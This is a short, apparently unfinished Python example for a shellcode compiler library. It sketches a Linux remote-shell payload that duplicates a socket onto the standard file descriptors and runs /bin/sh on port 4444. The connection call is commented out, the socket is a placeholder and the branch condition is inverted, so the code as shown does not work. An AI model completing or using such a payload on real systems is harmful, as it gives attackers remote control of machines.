import int3

HOST, PORT = "0.0.0.0", 4444


def main():
    cc = int3.Compiler.from_str("linux/x86_64")

    sockaddr = int3.struct.c_struct("""
        TODO
    """)

    # XXX
    # sock = cc.net_open_connection(ip_addr=HOST, port=PORT)
    sock = int3.ir.IntConstant.i32(-1)

    with cc.if_else(sock < 0) as (then, otherwise):
        with then:
            for fd in range(3):
                cc.sys_dup2(sock, fd)
            cc.sys_execve(b"/bin/sh")
        with otherwise:
            cc.sys_exit(0)

    print(cc.compile_ir())


if __name__ == "__main__":
    main()
